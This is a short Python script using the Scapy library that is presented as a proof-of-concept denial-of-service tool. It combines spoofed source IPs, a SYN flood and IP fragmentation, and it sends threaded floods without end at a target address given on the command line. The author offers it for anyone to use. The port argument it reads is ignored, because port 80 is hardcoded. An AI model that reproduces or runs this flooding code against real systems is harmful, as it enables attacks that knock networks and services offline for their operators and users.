#!/usr/bin/python
##
# inventedAttack.py - A POC attack combining IP SPoofing, SYN Flood and IP Fragmentation
# I only made this to feed my own curiosity (and for a classroom homework too tbh) 
# since it's not very effective nowadays, but feel free to use it!
#
#
# David Carracedo Martinez - dcarracedom@uoc.edu 2019
##

import random
import sys
import threading
from scapy.all import *

target = None
port = None
thread_limit = 200
total = 0
payload="A"*2000

class sendSYN(threading.Thread):
	global target, port, payload
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		#Layer 3 forging
		ip = IP()
		#Here comes the IP spoogin part, taking a big chunk of the
		#usable public IPv4 space at random.
		ip.src = "%i.%i.%i.%i" % (random.randint(193,222),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		ip.dst = target

		#Layer 4 forging
		tcp = TCP()
		tcp.sport = random.randint(1025,65535)
		tcp.dport = 80
		#Here comes the SYN flood mechanic part, yes, that easy
		#Only make sure you don't respond with another script!
		tcp.flags = 'S'

		#The actual packet
		packet=ip/tcp/payload
		#And finally the fagmentation and sending the fragments part
		frags=fragment(packet,fragsize=500)
		for fragments in frags:
			send(fragments,verbose=0)


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print "Usage: %s <Target IP> <Port>" % sys.argv[0]
		exit()

	target = sys.argv[1]
	port = int(sys.argv[2])


	print "Flooding %s:%i with SYN fragmented packets" % (target,port)
	while True:
		if threading.activeCount() < thread_limit:
			sendSYN().start()
			total+=1
			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)


